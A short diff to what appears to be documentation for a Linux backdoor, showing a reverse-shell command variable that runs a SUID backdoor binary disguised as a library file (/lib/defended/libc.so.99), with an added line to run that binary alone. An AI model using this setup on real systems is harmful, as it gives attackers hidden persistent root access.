@@ -313,6 +313,8 @@ $shell = "uname -a; w; $suid_bd";
 
 ```
 uname -a; w; /lib/defended/libc.so.99
+# or Just
+/lib/defended/libc.so.99
 ```
 
 <img width="895" height="286" alt="image" src="https://github.com/user-attachments/assets/0beef234-2d09-4348-97d2-78478de8a1f5" />
